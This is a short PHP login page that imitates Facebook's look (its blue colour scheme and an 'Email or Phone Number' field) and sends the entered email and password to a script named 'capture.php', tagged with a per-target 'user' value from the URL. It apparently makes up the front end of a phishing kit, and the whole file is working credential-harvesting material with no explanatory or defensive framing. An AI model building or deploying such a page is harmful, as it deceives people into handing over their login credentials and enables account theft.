<?php
session_start();
$user = $_GET['user'] ?? 'Guest';
$category = basename(__FILE__, '.php'); // Get current filename without .php
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - <?php echo ucfirst($category); ?></title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #e9ebee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 300px; text-align: center; }
        .login-box h2 { color: #1877f2; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 10px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; }
        .login-box button:hover { background-color: #166fe5; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2><?php echo ucfirst($category); ?></h2>
        <p>Login to continue</p>
        <form action="capture.php" method="POST">
            <input type="hidden" name="user" value="<?php echo htmlspecialchars($user); ?>">
            <input type="hidden" name="category" value="<?php echo htmlspecialchars($category); ?>">
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
